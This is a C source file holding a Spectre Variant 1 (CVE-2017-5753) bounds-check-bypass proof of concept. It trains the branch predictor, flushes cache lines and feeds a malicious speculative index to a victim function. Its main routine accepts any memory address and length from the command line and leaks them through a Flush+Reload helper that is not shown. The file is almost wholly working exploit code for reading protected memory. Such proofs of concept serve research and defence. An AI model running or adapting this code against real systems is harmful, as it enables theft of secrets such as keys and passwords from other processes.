/**
 * Spectre - Variant 1: Bounds Check Bypass (CVE-2017-5753)
 *
 * Description:
 *
 * Systems with microprocessors utilizing speculative execution and branch prediction
 * may allow unauthorized disclosure of information to an attacker with local user access
 * via a side-channel analysis.
 *
 */

#include "tools.h"

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

uint8_t temp = 0; // To not optimize victim() function

void victim(size_t x) {
    if (x < buffer.indices_size) {
        temp &= buffer.table[buffer.indices[x] * CACHE_PAGE];
    }
}

size_t exploit(size_t address, int tries) {
    size_t malicious_x = address - (size_t)buffer.indices;  // Set a malicious (speculative) array index
    size_t training_x = tries % buffer.indices_size;        // Set a valid (training) array index
    
    // 30 loops: 5 training runs (x = training_x), one attack run (x = malicious_x)
    for (int i = 29; i >= 0; i--) {
        _mm_clflush(&buffer.indices_size);          // Flush indices array size from cache to force branch prediction
        flush_pipeline;
        
        // Bit twiddling to set x = training_x if i % 6 != 0 or malicious_x if i % 6 == 0
        // Avoid jumps in case those tip off the branch predictor
        size_t x = ((i % 6) - 1) & ~0xFFFF; // Set x = FFFFF0000 if i % 6 == 0, else x = 0
        x = (x | (x >> 16));                // Set x = -1 if i & 6 = 0, else x = 0
        x = training_x ^ (x & (malicious_x ^ training_x));
        
        victim(x);
    }
    
    // Return the training index to exclude it from Flush+Reload test
    return buffer.indices[training_x];
}

int main(int argc, const char **argv) {
    void *address = secret;
    size_t len = strlen(secret);
    
    if (argc == 3) {
        sscanf(argv[1], "%p", &address);
        sscanf(argv[2], "%zd", &len);
    };
    
    printf("CVE-2017-5753: Spectre Variant 1\n");
    return execute(address, len, 1000, exploit);
}
